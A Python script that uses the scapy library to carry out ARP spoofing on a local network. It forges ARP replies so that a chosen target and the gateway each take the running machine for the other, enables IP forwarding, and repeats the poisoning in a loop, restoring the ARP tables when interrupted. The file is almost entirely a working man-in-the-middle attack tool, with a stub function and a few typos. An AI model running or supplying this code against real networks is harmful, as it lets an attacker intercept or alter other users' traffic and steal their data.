from scapy.all import *
from typing import List
from dataclasses import dataclass
import time
import os

@dataclass
class SpoofingInformation:
    ip_gateway: str = None
    ip_target: str = None
    mac_gateway: str = None
    mac_target: str = None

def get_ip_addresses_on_network() -> List[str]:
    """TODO"""
    pass

def set_packet_forwarding(value: bool) -> None:
    """TODO WINDOWS & Linux"""
    if value:
        os.system('sysctl -w net.inet.ip.forwarding=1')
    else:
        os.system('sysctl -w net.inet.ip.forwarding=0')

def get_mac_address(ip: str, interface: str) -> str:
    """Broadcast a packet to all devices on the network to get the mac address corresponding to the ip address"""
    arp_packet: Packet = Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(op = 1, pdst = ip)
    response: str = srp(arp_packet, timeout=5, verbose=False, iface=interface)[0][0][1].hwsrc
    return response

def get_spoof_packet(ip_target: str, mac_target: str, ip_spoof: str) -> Packet:
    """Creates a ARP packet"""
    # create packet, opcode = 2 since it needs to be a reply packet
    # pdst = ip address where the packet needs to go
    # hwdst = destination hardware address
    # pssrc = source ip address (let the receiver think that it is coming from this ip address)
    packet: Packet = ARP(op = 2, pdst = ip_target, hwdst = mac_target, psrc = ip_spoof)
    return packet

def reset(si: SpoofingInformation) -> None:
    """Function that sends the correct information to the target and gateway, spoofing is over!"""
    packet1: Packet = ARP(op = 2, pdst = si.ip_target, hwdst = 'ff:ff:ff:ff:ff:ff', psrc = si.ip_gateway, hwsrc = si.mac_gateway)
    packet2: Packet = ARP(op = 2, pdst = si.ip_gateway, hwdst = 'ff:ff:ff:ff:ff:ff', psrc = si.ip_target, hwsrc = si.mac_target)
    send(packet1, count=7, verbose=False)
    send(packet2, count=7, verbose=False)

def spoof(ip_target: str, ip_gateway: str, do_infitely: bool, interface: str,  seconds_to_wait: int = 0) -> None:
    """Spoof the target so that it thinks that this computer is the gateway, and spoof the gateway
    so that it thinks that this computer is the target"""

    si: SpoofingInformation = SpoofingInformation(ip_gateway = ip_gateway, ip_target = ip_target)
    # get the mac addresses of the target and the gateway
    si.mac_target = get_mac_address(ip_target, interface)
    si.mac_gateway = get_mac_address(ip_gateway, interface)

    # create the ARP packets to spoof
    packet_for_target: Packet = get_spoof_packet(si.ip_target, si.mac_target, si.ip_gateway)
    packet_for_gateway: Packet = get_spoof_packet(si.ip_gateway, si.mac_gateway, si.ip_target)

    # turn on packet forwarding
    set_packet_forwarding(True)

    if not do_infitely:
        send(packet_for_target, verbose = False) # since it is a L2 packet
        # turn of packet forwarding
        set_packet_forwarding(False)

    else:
        try:
            while True:
                # let the target think that this computer is the gateway
                send(packet_for_target, verbose = False)

                # let the gateway think that this computer is the garget
                send(packet_for_gateway, verbose = False)

                # wait for some seconds
                time.sleep(seconds_to_wait)
        except KeyboardInterrupt:
            print("\nExit...")
            reset(si)
            
            # turn off packet forwarding
            set_packet_forwarding(False)

if __name__ == '__main__':
    #get_mac_address('192.168.200.34')

    #ip_target: str = '192.168.200.1'
    ip_target: str = '192.168.200.1' # 19
    #ip_target: str = '192.168.200.1'
    ip_gateway: str = '192.168.200.254'
    spoof(ip_target, ip_gateway, True, 10)
    #reset(ip_target, gateway)
